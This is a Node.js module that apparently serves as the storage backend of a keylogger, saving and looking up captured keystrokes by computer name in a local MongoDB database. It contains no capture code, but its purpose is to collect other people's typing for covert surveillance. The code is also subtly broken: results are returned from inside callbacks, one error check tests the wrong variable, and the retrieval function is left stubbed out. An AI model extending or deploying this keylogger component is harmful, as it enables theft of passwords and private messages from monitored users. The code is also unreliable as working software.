const mongoDB = require("mongodb").MongoClient;

const keyLoggerRepo = {
  saveStrokes: (name, strokes) => {
    const newStrokes = {
      computerName: name,
      keystrokes: strokes
    };
    const saved = mongoDB.connect("mongodb://localhost:27017/", (error, db) => {
      if (error) {
        return false;
      } else {
        const currDb = db.db("admin");
        currDb.collection("Keystrokes").insertOne(newStrokes, (error, res) => {
          db.close();
          if (error) {
            return false;
          } else {
            return true;
          }
        });
      }
    });

    return saved;
  },
  retrieveKeyStrokes: () => {
    const db = mongoDB.connect("mongodb://localhost:27017/", (err, db) => {
        if(err){
            return false;
        } else {
            return db;
        }
    });

    console.log(db);
    // return new Promise((res, rej) => {
    //   mongoDB.connect("mongodb://localhost:27017/", (err, db) => {
    //     if (err) {
    //       rej(false);
    //     } else {
    //       const currDb = db.db("admin");
    //       currDb
    //         .collection("Keystrokes")
    //         .find()
    //         .toArray()
    //         .then(items => {
    //           res(items);
    //         })
    //         .catch(e => {
    //           console.log(e);
    //         });
    //     }
    //   });
    // });
  },
  searchKeyStrokesByName: name => {
    const success = mongoDB.connect("mongodb://localhost:27017/", (err, db) => {
      if (err) {
        return false;
      } else {
        const currDb = db.db("admin");
        currDb
          .collection("Keystrokes")
          .find({ computerName: name })
          .toArray((error, result) => {
            db.close();
            if (err) {
              return false;
            } else if (result) {
              return result;
            } else {
              return false;
            }
          });
      }
    });

    return success;
  }
};

module.exports = keyLoggerRepo;
